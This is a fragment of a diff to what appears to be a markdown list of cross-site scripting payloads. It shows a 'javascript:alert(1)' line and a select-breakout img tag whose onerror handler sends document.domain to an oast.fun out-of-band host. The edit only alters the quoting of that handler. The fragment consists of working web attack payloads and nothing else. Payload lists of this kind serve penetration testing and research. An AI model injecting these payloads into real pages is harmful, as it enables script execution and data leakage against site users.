@@ -43,7 +43,9 @@ javascript:alert(1)
 
 
 ```html
-"></select><img src=1 onerror="location='http://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun/?c='+document.domain;">
+"></select><img src=1 onerror=document.location='http://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun/?c='+document.domain;">
 ```
+
+
 
 
